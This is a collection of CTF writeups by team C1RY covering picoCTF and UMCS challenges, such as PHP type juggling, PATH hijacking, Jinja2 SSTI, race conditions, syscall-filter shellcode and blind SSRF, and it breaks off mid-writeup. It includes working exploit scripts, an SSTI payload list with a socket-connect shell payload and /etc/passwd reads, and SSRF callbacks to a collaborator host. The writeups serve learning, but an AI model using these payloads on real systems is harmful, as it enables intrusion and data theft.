<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-c1ry
description: CTF writeups and security challenges by C1RY.
---

# Writeups by C1RY

Source repository: `/repos/C1RY`

## Repository Index

- writeups/README.md
- writeups/07-03-2025-picoCTF/Apriti Sesamo.md
- writeups/07-03-2025-picoCTF/Hash-only 1.md
- writeups/07-03-2025-picoCTF/PIE TIME.md
- writeups/07-03-2025-picoCTF/README.md
- writeups/07-03-2025-picoCTF/SSTI2.md
- writeups/07-03-2025-picoCTF/WebSockFish.md
- writeups/11-04-2025-umcsCTF/Broken.md
- writeups/11-04-2025-umcsCTF/Hidden in Plain Graphic.md
- writeups/11-04-2025-umcsCTF/Hotline Miami.md
- writeups/11-04-2025-umcsCTF/README.md
- writeups/11-04-2025-umcsCTF/Straightforward.md
- writeups/11-04-2025-umcsCTF/babysc.md
- writeups/11-04-2025-umcsCTF/healthcheck.md
- writeups/11-04-2025-umcsCTF/http-server.md
- writeups/11-04-2025-umcsCTF/liveleak.md
- writeups/2025-02-28-synk-ctf/Coding Mountains.md
- writeups/2025-02-28-synk-ctf/README.md
- writeups/2025-02-28-synk-ctf/Weblog.md
- writeups/2025-02-28-synk-ctf/Zero Ex Six One.md
- writeups/28-12-2024-wargames.my-ctf/README.md

## Writeup Content


### File: writeups/07-03-2025-picoCTF/README.md

# PicoCTF 2025

![Screenshot 2025-03-22 151431](https://github.com/user-attachments/assets/5cf0b880-468b-4401-b80f-7274dd605819)

PicoCTF 2025 is a global cybersecurity challenge, and my team, **C1RY**, ranked in the **top 300 out of over 10,000 teams**

- **Team C1RY**:
- Afif Jazimin (RE)
- Nur Ameera Chan (Web Exploitation)
- Kho Jun Lin (Cryptography/Forensics)
- Chang Kae Pin (Cryptography/Forensics)



### File: writeups/11-04-2025-umcsCTF/README.md

# UMCS CTF 2025

![image](https://github.com/user-attachments/assets/7a042099-b8f5-4e4a-8544-7440015237ff)

UMCS CTF is a thrilling cybersecurity competition hosted by UM Cybersecurity Summit. 

**Team C1RY**:
- Afif Jazimin (RE/Stegnography)
- Nur Ameera Chan (Web Exploitation/Stegnography)
- Kho Jun Lin (Cryptography)
- Chang Kae Pin (Cryptography)



### File: writeups/2025-02-28-synk-ctf/README.md





### File: writeups/28-12-2024-wargames.my-ctf/README.md

# Writeup Wargames.MY CTF



### File: writeups/README.md

# writeups
CTF writeups



### File: writeups/07-03-2025-picoCTF/Apriti Sesamo.md

# Apriti Sesamo

|  | 300 points

Author: Junias Bonou

### Description

I found a web app that claims to be impossible to hack!

Hints:

1. Backup files
2. Rumor has it, the lead developer is a militant emacs user

![image](https://github.com/user-attachments/assets/1f6fff7c-1374-4f58-8a75-465325ecba96)

![image 1](https://github.com/user-attachments/assets/4965c5b4-fb74-46aa-846e-0face183baf1)

In Emacs, when you edit and save a file, it often creates a backup copy of the original file by appending a "~" symbol to the filename. This backup file might contain the original code.

/impossibleLogin.php~

```php
<?php 
	if(isset($_POST[base64_decode("\144\130\x4e\154\x63\155\x35\x68\142\127\125\x3d")])&& isset($_POST[base64_decode("\143\x48\x64\x6b")])){$yuf85e0677=$_POST[base64_decode("\144\x58\x4e\154\x63\x6d\65\150\x62\127\x55\75")];
		$rs35c246d5=$_POST[base64_decode("\143\x48\144\153")];if($yuf85e0677==$rs35c246d5){echo base64_decode("\x50\x47\112\x79\x4c\172\x35\x47\x59\127\154\163\132\127\x51\x68\111\x45\x35\166\x49\x47\132\163\131\127\x63\x67\x5a\155\71\171\111\x48\x6c\166\x64\x51\x3d\x3d");
	} else
		{
			if(sha1($yuf85e0677)===sha1($rs35c246d5))
			{
				echo file_get_contents(base64_decode("\x4c\151\64\166\x5a\x6d\x78\x68\x5a\x79\65\60\145\110\x51\75"));
			} else
			{
				echo base64_decode("\x50\107\112\171\x4c\x7a\65\107\x59\x57\154\x73\x5a\127\x51\x68\x49\105\x35\x76\111\x47\132\x73\131\127\x63\x67\x5a\155\71\x79\x49\110\154\x76\x64\x51\x3d\75");
			}
	}
}?>

WHICH MEANS:

<?php
if (isset($_POST["username"]) && isset($_POST["pwd"])) {
    $username = $_POST["username"];
    $password = $_POST["pwd"];
    if ($username == $password) {
        echo "Login failed!";
    } else {
        if (sha1($username) === sha1($password)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "Failed! No flag for you";
        }
    }
}
?>
```

- **Condition 1**: If username equals pwd ($username == $password), the login fails immediately.
- **Condition 2**: If username and pwd are different ($username != $password) but their SHA-1 hashes are identical (sha1($username) === sha1($password)), the flag is returned.
- **Otherwise**: If neither condition is met, it outputs the failure message you’re seeing.

### Exploiting PHP Type Juggling

In PHP, the sha1() function expects a string input. If you pass a non-string type like an array, PHP converts it to the string "Array" before hashing

- If username is an array like ["a"] and pwd is an array like ["b"]:
    - username != pwd because ["a"] and ["b"] are different arrays (array comparison in PHP checks key/value pairs).
    - sha1($username) becomes sha1("Array"), and sha1($pwd) also becomes sha1("Array"), which are equal because they hash the same string.

Our payload:

```jsx
import requests

url = "http://verbal-sleep.picoctf.net:50765/impossibleLogin.php"
data = {
    "username[]": "a",
    "pwd[]": "b"
}
response = requests.post(url, data=data)
print(response.text)
```

![image 2](https://github.com/user-attachments/assets/cc64e10d-bf6d-4998-848e-cd2d8865a2db)

The warning triggers because it received an array instead of a string. PHP’s type juggling kicks in here, converting both arrays to "Array", which is why the hashes match.

- Each call to sha1() (once for username and once for pwd) triggers a warning because it received an array instead of a string.
- PHP’s type juggling kicks in here, converting both arrays to "Array", which is why the hashes match.
- Then we get the flag: picoCTF{w3Ll_d3sErV3d_Ch4mp_2d9f3447}



### File: writeups/07-03-2025-picoCTF/Hash-only 1.md

# Hash-only 1

**Challenge Name:** FlagHasher

**Category:** Binary Exploitation / Privilege Escalation

**Description:** We are given a binary `flaghasher` that has enough privileges to read `/root/flag.txt`. However, instead of printing the flag, it computes and outputs the **MD5 hash** of the file. The goal is to retrieve the actual flag instead of just its hash.

---

### Running the Binary

Executing the binary gives the following output:

```
$ ./flaghasher
Computing the MD5 hash of /root/flag.txt....
4d4f660d53535446f15c1a3a7b535e50  /root/flag.txt
```

This confirms that the binary:

- Has read access to `/root/flag.txt`
- Uses `md5sum` to compute the hash
- Uses `system()` to execute shell commands

We used `strings` to check for the file functions:

```
$ strings flaghasher
...
/bin/bash -c 'md5sum /root/flag.txt'
...
system
...
```

This confirms that `flaghasher` is executing `md5sum /root/flag.txt` via `system()`, meaning it might be vulnerable to **PATH hijacking**.

---

## 

Since `system()` executes commands without specifying absolute paths, we can create a **fake `md5sum`** script and manipulate `PATH` to trick the binary into running our script instead.

### **1. Create a Fake `md5sum` Script**

```
echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
chmod +x md5sum
```

This script will simply **print the contents** of `/root/flag.txt` instead of computing the MD5 hash.

### **2. Create a Fake Binary Directory**

```
mkdir /tmp/fakebin
mv md5sum /tmp/fakebin/
```

Now, we have placed our fake `md5sum` inside a directory that we control.

### **3. Modify the `PATH` Variable**

```
export PATH="/tmp/fakebin:$PATH"
```

This ensures that when `flaghasher` runs `md5sum`, it will execute **our fake script** instead of the real one.

### **4. Run `flaghasher` Again**

```
./flaghasher
```

![image](https://github.com/user-attachments/assets/b0fa8102-a512-4570-8c0b-197436707092)



### File: writeups/07-03-2025-picoCTF/PIE TIME.md

# PIE TIME Writeup

**Challenge Name:** PIE TIME

**Points:** 75

**Author:** Darkraicg492

**Description:**

Can you try to get the flag? Beware we have PIE!

## Understanding the Challenge

The challenge involves Position Independent Executables (PIE), meaning addresses of functions are randomized at runtime. Our goal is to hijack execution to call the `win()` function, which prints the flag.

## Analyzing the Binary

We analyse the given binary using `strings`, `objdump`, and `gdb`.

### **Finding Function Offsets**

Using `gdb`:

```
gdb ./vuln
disassemble win
```

This gives us the offset of `win()` in the binary:

```
0x00000000000012a7 <win>
```

### Finding `main()` Address at Runtime

Running the binary with `netcat`:

```
nc rescued-float.picoctf.net 63848
Address of main: 0x5c6a291d133d
Enter the address to jump to, ex => 0x12345:
```

Finding `main` offset:

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ objdump -d vuln | grep "<main>"
    11c1:       48 8d 3d 75 01 00 00    lea    0x175(%rip),%rdi        # 133d <main>
000000000000133d <main>:
    1387:       48 8d 35 af ff ff ff    lea    -0x51(%rip),%rsi        # 133d <main>
```

### Calculating `win()` Address

Since PIE is enabled, function addresses are determined at runtime. We calculate `win()` actual address using:

```
win_addr = (main_addr - main_offset) + win_offset
```

where:

- `main_addr = 0x5c6a291d133d` (runtime address of main)
- `main_offset = 0x133d` (static offset of main from `objdump`)
- `win_offset = 0x12a7` (static offset of win from `gdb`)

Calculating:

```
win_addr = (0x5c6a291d133d - 0x133d) + 0x12a7
         = 0x5c6a291d0000 + 0x12a7
         = 0x5c6a291d12a7
```

## Exploiting the Binary

We input the computed address into the program:

```
Enter the address to jump to, ex => 0x12345: 0x5c6a291d12a7
```
![image](https://github.com/user-attachments/assets/d5ecca14-1773-4815-be82-7b6271b6ee3a)




### File: writeups/07-03-2025-picoCTF/SSTI2.md

# SSTI2

AUTHOR: VENAX

Description

I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.

Hints:

1. Server Side Template Injection
2. Why is blacklisting characters a bad idea to sanitize input?

This challenge is the continuation of SSTI1, based on the title we could already know it is related to Server Side Template Injection attack. However, this challenge mentioned it has blocked certain characters.

![1000170803](https://github.com/user-attachments/assets/718192db-09ba-4b1c-b002-11bc159ea19e)

We could not identified filtering used based on the website source code:

```java
<!doctype html>
      <title>SSTI2</title>
<h1> Home </h1>
<p> I built a cool website that lets you announce whatever you want!* </p><form action="/" method="POST"> 
What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
      </form>
      <p style="font
size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
```

We already know the website is using Jinja2 as template engine based on challenge SSTI1.

{{7*’7’}} returns 7777777 → Jinja2

We will brute force to identify the correct payload based on Jinja2:

```jsx
{{4*4}}
{{7*7}}
{{7*'7'}}
{{dump(app)}}
{{app.request.server.all|join(',')}}
{{config.items()}}
{{ [].class.base.subclasses() }}
{{''.class.mro()[1].subclasses()}}
{{ ''.__class__.__mro__[2].__subclasses__() }}
{% for key, value in config.iteritems() %}<dt>{{ key|e }}</dt><dd>{{ value|e }}</dd>{% endfor %}
{{ request }}
{{self}}
{{app.request.query.filter(0,0,1024,{'options':'system'})}}
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/etc/passwd").read() }}
{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
{{request|attr(["_"*2,"class","_"*2]|join)}}
{{request|attr(["__","class","__"]|join)}}
{{request|attr("__class__")}}
{{request.__class__}}
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
{{self._TemplateReference__context.cycler.__init__.__globals__.os}}
{{self._TemplateReference__context.joiner.__init__.__globals__.os}}
{{self._TemplateReference__context.namespace.__init__.__globals__.os}}
{{cycler.__init__.__globals__.os}}
{{joiner.__init__.__globals__.os}}
{{namespace.__init__.__globals__.os}}
```

We successfully identified the correct payload that successfully executed on the server:

![image](https://github.com/user-attachments/assets/706a2f6f-844d-4298-8ba8-fe5d4c8a4d4d)


This is the full payload:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}

All we need to do know is to change the id to cat flag:

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}

What the code does?

- \x5f is the hex encoding of _ (underscore)

The payload first sends the request and gives access to Flask application interface. It allow us to gain access to global variables. Next, it access global and builtins that allow access to builtin python functions such as import and open. import os helps load the os module that allows file manipulation and file access. os.popen(’cat flag’) will get the flag and read() will get output of the command and displays it. 

And we get the flag:

**picoCTF{sst1_f1lt3r_byp4ss_8b534b82}**



### File: writeups/07-03-2025-picoCTF/WebSockFish.md

# WebSockFish

Author: Venax

### Description

Can you win in a convincing manner against this chess bot? He won't go easy on you!You can find the challenge

Hint:
Try understanding the code and how the websocket client is interacting with the server

---

### **Understanding the Client-Server Interaction**

- **Client-Side Code**:
    
    The website uses stockfish to evaluate the game from the bot perspective (black pieces). Evaluations are sent to the server via WebSocket.
    
    ```
    stockfish.onmessage = function (event) {
            var message;
            // console.log(event.data);
            if (event.data.startsWith("bestmove")) {
              var bestMove = event.data.split(" ")[1];
              var srcSq = bestMove.slice(0, 2);
              var dstSq = bestMove.slice(2, 4);
              var promotion = bestMove.slice(4);
    
              game.move({ from: srcSq, to: dstSq, promotion: promotion });
              board.position(game.fen());
            } else if (event.data.startsWith(`info depth ${DEPTH}`)) {
              var splitString = event.data.split(" ");
              if (event.data.includes("mate")) {
                message = "mate " + parseInt(splitString[9]);
              } else {
                message = "eval " + parseInt(splitString[9]);
              }
              sendMessage(message);
            }
    ```
    

---

### **Initial Misunderstanding: `mate 0` as a Winning Condition**

- **My First Assumption**:
    
    Initially, I thought the goal was to win the game and send `sendMessage("mate 0")`, assuming this would signal to the server that I had won and should receive the flag.
    
    However, the server did not give me the flag based on `mate` values. 
    
- `mate 9999999` → "Haha I think you're gonna drown in 9999999 moves."
- `mate -9999999` / `mate 0` → "You may eventually checkmate me, but you will never break my spirit as a fish!!"
    
    <img width="335" alt="image" src="https://github.com/user-attachments/assets/74c53fda-40c0-47e8-87c5-2566ba9d0e7c" />

    
    <img width="460" alt="image 1" src="https://github.com/user-attachments/assets/adab93fa-912b-447e-bab3-5f8ef6230c0c" />

    
---

### **Identify the Exploitable Flaw**

- **Server Trusts Client Evaluations**:
    
    The server does not validate the actual game state. It depends on client evaluations to determine if the user wins or losses.
    
- **Chat Response Patterns for `eval` Values**:
    - `eval -269` → "Don't think I'm gonna make it easy for you!"
    - `eval -353` → "I wouldn't have played that if I were you."
    - `eval 0` → "I think this position is pretty equal."
    - This suggests that the server uses `eval` messages to assess game status.
    

---

### **Exploiting the Flaw**

### **Directly Send `eval -9999`**

- Use browser dev tools to send `eval -9999` via WebSocket:
    
    ```
    sendMessage("eval -9999");
    ```
    
    - **Why?** Stockfish will think they are losing so badly since the evaluation (eval) is based on the likeliness of winning the game

---

<img width="308" alt="image 2" src="https://github.com/user-attachments/assets/b47ebe8c-6919-4e71-86f0-3a6081df7054" />

<img width="476" alt="image 3" src="https://github.com/user-attachments/assets/e14cd755-29a7-44e7-b9e8-c4d40bb6a4a4" />



### File: writeups/11-04-2025-umcsCTF/Broken.md

# Broken

Can you fix broken mp4?

https://github.com/user-attachments/assets/9df9121a-a17b-44fe-b992-986b372b1533

I had never encountered a challenge involving a broken MP4 file before. Based on some research, I discovered that there are tools available to repair corrupted MP4 files. My first approach was to try one of these websites:  [Free Video Repair Online: Fix Corrupted MP4/MOV in Minutes](https://repair.easeus.com/#upload) 

![image](https://github.com/user-attachments/assets/481a7c67-c9df-4828-a3f2-b7b26c95da92)

After the website finished repairing the video, I played the file and that is when I saw the flag.

![image 1](https://github.com/user-attachments/assets/6b3a33a3-560d-42fe-831e-bd8967da9279)




### File: writeups/11-04-2025-umcsCTF/Hidden in Plain Graphic.md

# Hidden in Plain Graphic

Agent Ali, who are secretly a spy from Malaysia has been communicate with others spy from all around the world using secret technique . Intelligence agencies have been monitoring his activities, but so far, no clear evidence of his communications has surfaced. Can you find any suspicious traffic in this file?

## [plain_zight.pcap](https://umcsctfprelims.horizononsight.xyz/files/bc65940732fe5a26b0195e0c8c5cc9da/plain_zight.pcap?token=eyJ1c2VyX2lkIjozOSwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6OH0.Z_i3BA.8oh3A0skvLoFNhBaIS6PifNtLwA)

The first step I took in the Wireshark analysis was sorting the packets in ascending and descending order based on the Info column. This helped me quickly spot some interesting TCP packets:

![image](https://github.com/user-attachments/assets/084d02b8-2196-43dc-b190-7868d6f55887)


Upon closer inspection, I noticed that the stream begins with `.PNG` and ends with `IEND`, which strongly suggests that it's a PNG file. I then switched the data view to raw from hexdump and exported it as `image.bin`. 

After that, I simply renamed `image.bin` to `image.png`, and the image displayed successfully:

![image 1](https://github.com/user-attachments/assets/25104605-3e14-400b-b9b4-85eb223a0f07)


My instincts told me that this might involve image steganography, so I uploaded the file to [Aperi'Solve](https://www.aperisolve.com/) for analysis.

One of the tools used by Aperi'Solve is `zsteg`, which is designed to detect hidden data in PNG and BMP images particularly within the least significant bits (LSBs) of pixel values. From the `zsteg` analysis output, we were able to extract the flag.

![image 2](https://github.com/user-attachments/assets/8a2c0e44-990d-460f-bedb-7c9183d7971c)



### File: writeups/11-04-2025-umcsCTF/Hotline Miami.md

## Hotline Miami

![image 3](https://github.com/user-attachments/assets/07cf8ef8-c782-4a25-91fd-a439f16e87df)

![image 4](https://github.com/user-attachments/assets/e1c55623-dbeb-4d3f-867d-83eca20069cd)


1. **Analyze the file using Audacity**

![image 5](https://github.com/user-attachments/assets/1bfeeb63-6926-4c78-8818-8d02e0a26155)


written as “ WATCHING 1989”

**2.  Use AperiSolve**

![image 6](https://github.com/user-attachments/assets/30541ab6-cefd-4d87-9321-aa6b0bcc0359)

Analyze the hints

![image 7](https://github.com/user-attachments/assets/a870e791-b04c-4f2e-81ba-f0ea73fee45a)

**try an error 
Flag: umcs{RICHARD_BE_WATCHING_1989}**



### File: writeups/11-04-2025-umcsCTF/Straightforward.md

# Straightforward

**Easy**

Test out our game center. You'll have free claiming bonus for first timers!

*Author: vicevirus ** **Flag format: UMCS{...}**

[http://159.69.219.192:7859/](http://159.69.219.192:7859/)

The challenge required a balance of $3000 to redeem a flag, but each user started with only $1000. The daily bonus system added $1000 more, totaling just $2000—still $1000 short of the goal.

---

The dashboard offered three actions:

- **Collect Daily Bonus**: A `POST` form to `/claim`
- **Redeem Secret Reward ($3000)**: A `POST` form to `/buy_flag`
- **Logout**: A `GET` form to `/logout`

Attempting to buy the flag via `/buy_flag` resulted in a redirect to `/dashboard` with a flash message:

> “Insufficient funds to redeem the reward.”
> 

This confirmed that I needed $3000 in my account, $1000 more than what I could normally accumulate.

---

### CSRF Vulnerability: A Dead End

I noticed the website relied solely on HTTP cookies to identify users, making it vulnerable to **Cross-Site Request Forgery (CSRF)**. Here’s how I explored that path:

![7f2998c0-4319-442b-963d-e91c4c5b7051](https://github.com/user-attachments/assets/524dcb00-9e93-46c7-b248-48a92f2dd2a5)

![image](https://github.com/user-attachments/assets/c40228a1-b845-4209-80d2-fcb3462fcca2)

### **First Attempt: CSRF on `/claim`**

I hypothesized I could trick other users into claiming their daily bonus and somehow redirect the funds to my account.

Example request:

```php
POST /claim HTTP/1.1
Host: 159.69.219.192:7859
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Cookie: session=eyJ1c2VybmFtZSI6InNveXJpYSJ9...
```

The request had no body and relied on the session cookie. I created a malicious HTML page to force other users to unknowingly trigger the request:

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="http://159.69.219.192:7859/claim" method="POST">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Unfortunately, the bonus was credited to the victim's account not mine as the server used the session cookie to identify the recipient.

### **Second Attempt: Parameter Injection**

I tried modifying the form to include a `username` parameter:

```html
<input type="hidden" name="username" value="attacker">
```

I even tried variations like `user=attacker`, `recipient=attacker`, and `claim_for=attacker`, but all were ignored. The server exclusively trusted `session['username']`. Thus, CSRF alone couldn’t redirect funds.

### XSS Exploration

While exploring, I noticed reflected input in the `username` parameter on `/dashboard`. Example:

```
GET /dashboard?username=soyriavypu57uu4k
```

Returned:

```html
<h2>Hello, soyriavypu57uu4k</h2>
```

I tested for **XSS** with:

```html
/dashboard?username="><script>alert('xss')</script>
```

But input was either encoded or blocked by the browser due to `HttpOnly` cookies. XSS wasn't exploitable here.

---

### Discovering Project Files & Race Conditions

Halfway through, I accessed the project codebase and identified two critical vulnerabilities:

1. **IDOR in `dashboard`**:
    
    ```python
    display_user = request.args.get('username') or session['username']
    ```
    
    This meant appending `?username=target_user` allowed me to view any user's balance. While helpful for recon, it didn’t help me increase *my* balance.
    
2.  **Race Condition in `/claim`**
    
    The real goldmine was a **race condition** caused by poor SQLite handling:
    
    The code used:
    
    ```python
    def get_db():
        if 'db' not in g:
            g.db = sqlite3.connect(DATABASE, check_same_thread=False)
            g.db.row_factory = sqlite3.Row
        return g.db
    
    def claim():
        if 'username' not in session:
            return redirect(url_for('register'))
        username = session['username']
        db = get_db()
        cur = db.execute('SELECT claimed FROM redemptions WHERE username=?', (username,))
        row = cur.fetchone()
        if row and row['claimed']:
            flash("You have already claimed your daily bonus!", "danger")
            return redirect(url_for('dashboard'))
        db.execute('INSERT OR REPLACE INTO redemptions (username, claimed) VALUES (?, 1)', (username,))
        db.execute('UPDATE users SET balance = balance + 1000 WHERE username=?', (username,))
        db.commit()
        flash("Daily bonus collected!", "success")
        return redirect(url_for('dashboard'))
    ```
    
    - **`check_same_thread=False`** for SQLite
    - No locking
    - No transaction wrapping for the check-update process
    
    This allowed concurrent POSTs to **`/claim`** to bypass the daily bonus limit.
    

### Exploiting the Race Condition

I wrote a simple Python script to send multiple concurrent requests:

```python
import requests
import threading

url = "http://159.69.219.192:7859/claim"
cookies = {"session": "eyJ1c2VybmFtZSI6InNmYWRhZGRzYWQifQ.Z_oEBg.Lfs9yLumisWCZMvNsIN8ofeEx08"}

def send_claim():
    response = requests.post(url, cookies=cookies)
    print(response.text)

threads = []
for _ in range(10):  # Send 10 concurrent requests
    t = threading.Thread(target=send_claim)
    threads.append(t)
    t.start()

for t in threads:
    t.join()
```

After execution, I checked `/dashboard` and saw my balance jump to **6000 units** confirming multiple bonuses were granted before the server marked the daily claim as complete.

![image 1](https://github.com/user-attachments/assets/a0c2b878-751d-4739-bef7-401bd10e83b0)

![image 2](https://github.com/user-attachments/assets/c7281081-20ee-4ce4-9700-68a2b084809c)


### Buying the Flag

- With enough funds, I sent:

```php
POST /buy_flag HTTP/1.1
Host: 159.69.219.192:7859
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
Origin: http://159.69.219.192:7859
Connection: keep-alive
Referer: http://159.69.219.192:7859/dashboard
Cookie: session=eyJ1c2VybmFtZSI6ImRhc2RhZGF3ZGFzZCJ9.Z_ytuA.PIGnlrnvTZaipYwCne8B3BektPI
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

- The response contained the flag: `UMCS{...}`
    
![image 3](https://github.com/user-attachments/assets/300424ac-d985-41c3-9651-21f2c767b69b)

    
  ## Why CSRF Failed?
    
  - The server correctly tied bonus credit to the authenticated user in the session. Without a server-side flaw, CSRF couldn’t reroute bonuses.
    
### IDOR’s Role
    
  - It only revealed balances and was good for recon but useless for escalation.
    
### Race Condition Insight
    
  - The lack of atomic transactions and poor SQLite handling allowed me to bypass balance restrictions and exploit the logic race.



### File: writeups/11-04-2025-umcsCTF/babysc.md


### babysc (Pwn)

![image 1](https://github.com/user-attachments/assets/d754e898-6e6f-4ddc-b87f-e73e0679ade1)


### Overview

- **Challenge**: Execute shellcode on a remote server to read and output /flag.
- **Setup**: Binary maps rwx memory at 0x26e45000, accepts 0x1000 bytes of shellcode, bans bytes 0x80cd, 0x340f, 0x050f (system call instructions).
- **Goal**: Open /flag, read it, write to stdout, exit cleanly.

### Constraints

- **Banned Bytes**: 0x80cd (int 0x80), 0x340f (sysenter), 0x050f (syscall).
- **Impact**: No direct system calls allowed.

### Approach

- **Self-Modifying Shellcode**:
    - Use stub 0x0f 0x04 (safe initially).
    - Modify to 0x0f 0x05 (syscall) at runtime.
    - Perform system calls with modified stub.

### Solution

1. **Shellcode (NASM)**:
    
    
    ```jsx
    BITS 64
    _start:
        lea rax, [rel stub]
        mov byte [rax + 1], 0x05    *; Make syscall*
        lea rdi, [rel flag_str]     *; "/flag"*
        mov rax, 2                  *; open*
        mov rsi, 0                  *; O_RDONLY*
        call stub
        mov r12, rax                *; Save fd*
        mov rax, 0                  *; read*
        mov rdi, r12
        lea rsi, [rel buffer]
        mov rdx, 0x100              *; 256 bytes*
        call stub
        mov rax, 1                  *; write*
        mov rdi, 1                  *; stdout*
        lea rsi, [rel buffer]
        mov rdx, 0x100
        call stub
        mov rax, 60                 *; exit*
        mov rdi, 0
        call stub
    stub:
        db 0x0f, 0x04               *; Becomes 0x0f 0x05*
        ret
    flag_str: db "/flag", 0
    buffer: times 256 db 0
    ```
    
    - **Compile**: nasm -f bin shellcode.asm -o shellcode.bin
2. **Verification**:
    
    ```python
    `with open("shellcode.bin", "rb") as f:
        data = f.read()
    bad_words = [0x80cd, 0x340f, 0x050f]
    for i in range(len(data) - 1):
        word = data[i] | (data[i + 1] << 8)
        if word in bad_words:
            print(f"Bad byte at {i}: {hex(word)}")
            exit(1)
    print("No bad bytes found.")`
    
    - **Result**: No bad bytes.
    ```
    
3. **Exploit (pwntools)**:
    
    ```python
    from pwn import *
    context.arch = 'amd64'
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    r = remote("34.133.69.112", 10001)
    r.send(shellcode)
    print(r.recvall().decode())
    r.close()
    ```
    
    - **Output**: **umcs{shellcoding_78b18b51641a3d8ea260e91d7d05295a**}



### File: writeups/11-04-2025-umcsCTF/healthcheck.md

# healthcheck

I left my hopes_and_dreams on the server. can you help fetch it for me?

[http://104.214.185.119/index.php](http://104.214.185.119/index.php)

**This website allows users to check the HTTP status code of any URL they enter.**

You just type in a link like http://example.com and the site tells you whether that page is reachable by returning a status code like 200 OK (success) or 404 Not Found. It 
does not show the page content just the status code.

**Payload**:

url = [http://104.214.185.119/index.php](http://104.214.185.119/index.php)

![548e99e2-3e15-40a5-9041-6af3f8097bcd](https://github.com/user-attachments/assets/99d6ac4c-7d0a-42a8-9cc8-9ff35fb8cd2f)

The server responded with a 200 status code, indicating it successfully fetched the page. I noticed the server only returned the status code and not the response body, suggesting this might be a Blind SSRF (Server-Side Request Forgery) challenge. That meant I couldn't directly view internal resources like the flag.

**Payload**:

`url=http://localhost`

This returned a 403 Forbidden response, implying that direct access to localhost was blocked.

**Payload**:

`url=http://127.0.0.1`

This also returned a 403, confirming that both hostname and IP-based access to internal services were restricted. I suspected basic SSRF protections were in place and started looking for bypasses using internal hostnames.

![171364cd-b354-4967-9be0-4ec824c193c9](https://github.com/user-attachments/assets/056024b0-1071-4f33-865b-a8d1153116e5)


Since localhost was blocked, I might be that the server is using internal hostnames that weren’t restricted. A common internal service name like healthcheck seemed worth testing.

**Payload**:

`url=http://healthcheck/hopes_and_dreams`

![image](https://github.com/user-attachments/assets/a5d7151f-31fb-428b-ac79-a9556ed8d15e)

This was a good discovery. The server returned 200, meaning healthcheck was a valid internal hostname and /hopes_and_dreams was an accessible endpoint or file. This could potentially contain the flag, but since this is a blind SSRF, I couldn’t view the contents directly.

To confirm the SSRF vulnerability, I injected a Burp Collaborator payload:

![Screenshot_2025-04-14_140954](https://github.com/user-attachments/assets/0fc76c35-5743-4cfc-9ab4-d4bebd5e3012)


The application made an HTTP request to my Collaborator domain confirming it was vulnerable to **Blind SSRF**.

![image 1](https://github.com/user-attachments/assets/ba7d78b0-a21b-4814-875b-0fb42b925069)

### Attempting Parameter-Based Exfiltration

Next, I tried appending parameters to trick /hopes_and_dreams into making outbound requests with 

payloads:

`url=http://healthcheck/hopes_and_dreams?callback=z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

`url=http://healthcheck/hopes_and_dreams?webhook=z9992jhxfhoaqrrutldhhjqriio9cz0o.oastify.com`

No interactions were observed in Burp Collaborator. This implied /hopes_and_dreams was likely a static file or an endpoint that ignored URL parameters.

### Discovering the exec Endpoint

